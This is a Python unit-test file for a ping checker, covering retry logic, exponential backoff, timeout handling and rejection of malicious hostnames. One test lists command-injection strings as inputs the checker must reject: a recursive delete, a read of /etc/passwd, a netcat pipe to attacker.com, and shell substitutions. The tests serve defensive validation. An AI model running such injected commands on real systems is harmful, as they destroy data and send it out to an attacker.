"""
Unit tests for PingChecker with retry logic and input sanitization.

TESTES IMPLEMENTADOS:
- Mock de subprocess.run para evitar chamadas reais
- Validação de retry logic (3 tentativas)
- Validação de input sanitization (command injection prevention)
- Testes de backoff exponencial
"""

import unittest
from unittest.mock import patch, MagicMock
import time
from src.checkers.ping_checker import PingChecker


class TestPingCheckerWithRetry(unittest.TestCase):
    """Test cases for PingChecker with retry logic."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.checker = PingChecker(timeout=2, max_retries=3, retry_delay=0.1)
    
    @patch('src.checkers.ping_checker.subprocess.run')
    def test_successful_ping_first_attempt(self, mock_run):
        """Test successful ping on first attempt (no retries needed)."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        result = self.checker.check('8.8.8.8')
        
        self.assertEqual(result['status'], 'ok')
        self.assertIsNotNone(result['response_time_ms'])
        self.assertIsNone(result['error'])
        self.assertEqual(result['attempts'], 1)
        self.assertEqual(result['retry_count'], 0)
        self.assertEqual(mock_run.call_count, 1)
    
    @patch('src.checkers.ping_checker.subprocess.run')
    def test_successful_ping_after_retries(self, mock_run):
        """Test successful ping after 2 failed attempts (retry logic working)."""
        # First two calls fail, third succeeds
        mock_result_fail = MagicMock()
        mock_result_fail.returncode = 1
        
        mock_result_success = MagicMock()
        mock_result_success.returncode = 0
        
        mock_run.side_effect = [mock_result_fail, mock_result_fail, mock_result_success]
        
        start_time = time.time()
        result = self.checker.check('8.8.8.8')
        elapsed = time.time() - start_time
        
        self.assertEqual(result['status'], 'ok')
        self.assertIsNotNone(result['response_time_ms'])
        self.assertEqual(result['attempts'], 3)
        self.assertEqual(result['retry_count'], 2)
        self.assertEqual(mock_run.call_count, 3)
        
        # Verify exponential backoff occurred (0.1s + 0.2s = 0.3s minimum)
        self.assertGreaterEqual(elapsed, 0.3)
    
    @patch('src.checkers.ping_checker.subprocess.run')
    def test_all_retries_fail(self, mock_run):
        """Test that all 3 attempts fail and final result is failure."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_run.return_value = mock_result
        
        result = self.checker.check('192.168.255.255')
        
        self.assertEqual(result['status'], 'fail')
        self.assertIsNone(result['response_time_ms'])
        self.assertIsNotNone(result['error'])
        self.assertEqual(result['attempts'], 3)
        self.assertEqual(result['retry_count'], 2)
        self.assertEqual(mock_run.call_count, 3)
    
    @patch('src.checkers.ping_checker.subprocess.run')
    def test_timeout_with_retries(self, mock_run):
        """Test timeout handling with retry logic."""
        import subprocess
        mock_run.side_effect = subprocess.TimeoutExpired('ping', 2)
        
        result = self.checker.check('slow-host.example.com')
        
        self.assertEqual(result['status'], 'fail')
        self.assertIsNone(result['response_time_ms'])
        self.assertIn('Timeout', result['error'])
        self.assertEqual(result['attempts'], 3)
        self.assertEqual(mock_run.call_count, 3)
    
    def test_input_validation_reject_invalid_hostname(self):
        """Test input sanitization rejects malicious hostnames."""
        # Test command injection attempts
        malicious_hosts = [
            '8.8.8.8; rm -rf /',
            '8.8.8.8 && cat /etc/passwd',
            '8.8.8.8 | nc attacker.com 1234',
            '$(malicious_command)',
            '`evil_command`',
            'host; DROP TABLE users;',
        ]
        
        for malicious_host in malicious_hosts:
            with self.subTest(host=malicious_host):
                result = self.checker.check(malicious_host)
                
                self.assertEqual(result['status'], 'fail')
                self.assertIn('Invalid hostname', result['error'])
                self.assertEqual(result['attempts'], 0)
    
    def test_input_validation_accept_valid_hostnames(self):
        """Test input sanitization accepts valid hostnames and IPs."""
        valid_hosts = [
            '8.8.8.8',
            '192.168.1.1',
            'google.com',
            'sub.domain.example.com',
            'host-with-dash.com',
            'test123.example.org',
        ]
        
        with patch('src.checkers.ping_checker.subprocess.run') as mock_run:
            mock_result = MagicMock()
            mock_result.returncode = 0
            mock_run.return_value = mock_result
            
            for valid_host in valid_hosts:
                with self.subTest(host=valid_host):
                    result = self.checker.check(valid_host)
                    
                    self.assertEqual(result['status'], 'ok')
                    self.assertGreater(result['attempts'], 0)
    
    def test_ipv6_address_validation(self):
        """Test that IPv6 addresses are accepted."""
        with patch('src.checkers.ping_checker.subprocess.run') as mock_run:
            mock_result = MagicMock()
            mock_result.returncode = 0
            mock_run.return_value = mock_result
            
            result = self.checker.check('::1')
            self.assertEqual(result['status'], 'ok')
            
            result = self.checker.check('2001:4860:4860::8888')
            self.assertEqual(result['status'], 'ok')
    
    @patch('src.checkers.ping_checker.subprocess.run')
    def test_shell_false_used(self, mock_run):
        """Verify that shell=False is used in subprocess.run (security check)."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        self.checker.check('8.8.8.8')
        
        # Verify subprocess.run was called with list (not string) and check=False
        call_args = mock_run.call_args
        self.assertIsInstance(call_args[0][0], list)
        self.assertFalse(call_args[1].get('shell', False))


if __name__ == '__main__':
    unittest.main()
